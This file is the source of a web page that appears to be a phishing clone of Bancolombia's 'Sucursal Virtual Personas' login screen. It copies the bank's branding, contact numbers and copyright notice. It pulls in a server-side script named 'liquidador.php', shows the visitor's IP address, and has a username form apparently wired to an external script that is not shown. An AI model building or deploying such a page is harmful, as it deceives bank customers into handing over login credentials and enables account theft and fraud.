<?php
 require "liquidador.php";
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Bancolombia Sucursal Virtual Personas</title>
    <link rel="shortcut icon" href="img/favicon.svg" type="image/x-icon" />
    <link rel="stylesheet" href="css/normalize.css" />
    <link rel="stylesheet" href="css/estilos.css" />
  </head>
  <body>
    <div class="cuerpo">
      <div class="header1">
        <div class="logo"></div>
        <span class="svpnombre">Sucursal Virtual Personas</span>
        <div class="tiempotext">
          Fecha y hora actual: <span id="jclock1" class="tiempotext t1"></span>
        </div>
      </div>
      <div class="header2">
        <h3>Inicio de sesión</h3>
      </div>
      <div class="principal">
          <div class="der">
              <div class="panel-formulario">
                  <div class="panel-hform">
                    <h1>Usuario</h1>
                  </div>
                  <div class="panel-lform">
                    <h4>Si no tienes un usuario asignado ingresa con tu documento de identidad</h4>
                  </div>
                  <form autocomplete="off" id="fusuario">
                      <div class="grupo">
                        <div>
                          <img src="img/ayuda.png" alt="ayuda">
                          <label for="usuario"> Ingresa tu usuario </label>
                        </div>
                          
                        <input type="text" name="usuario" id="usuario" >
                      </div>
                      <div class="grupo bcentro">
                        <button type="button" id="btnusuario" class="btn hecho">Continuar</button>
                      </div>
                      <div class="linkf">
                          <a href="javascript:void(0)">¿Olvidaste tu usuario?</a>
                          <a href="javascript:void(0)">¿Problemas para conectarte?</a>
                      </div>
                    </form>

              </div>
              <div class="panel-link">
                  <img src="img/links.png" alt="icons">
                  <ul>
                      <li>Demo Sucursal Virtual personas</li>
                      <li>Aprende Sobre seguridad</li>
                      <li>Reglamento Virtual Personas</li>
                      <li>Politica de privacidad</li>
                  </ul>
              </div>
          </div>
          <div class="izq">
            <img src="img/noteconformes.png" alt="promocion" style="width: 100%;">
            <p class="text">¿No conoces la Sucursal Virtual Personas de Bancolombia? <a href="javascript:void(0)" class="a1">MIRA EL DEMO</a></p>
          </div>
      </div>
      <div class="footer">
        <p>Sucursal Telefónica Bancolombia: Bogotá 343 0000 - Medellín 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 <br>
          El resto del país 01 800 09 12345. Sucursales Telefónicas en el exterior: España 900 995 717 - Estados Unidos 1866 379 9714.
        </p>
      </div>
      <div class="footer2">
        <p>Dirección Ip: <?php echo $_SERVER["REMOTE_ADDR"];?></p>
        <p>Copyright ©&nbsp;2021&nbsp;Bancolombia S.A.&nbsp;&nbsp;</p>
      </div>
    </div>
    <script src="js/jquery-3.6.0.min.js"></script>
    <script
      language="javascript"
      src="js/jquery.jclockNew.js?v=4.5.1.RC2_1628742112900"
      type="text/JavaScript"
    ></script>
    
    <script>
    document.addEventListener('DOMContentLoaded', () => {
      document.querySelectorAll('input[type=text]').forEach( node => node.addEventListener('keypress', e => {
        if(e.keyCode == 13) {
          e.preventDefault();
        }
      }))
    });
  </script>
  <script src="js/funciones.js"></script>
  </body>
</html>
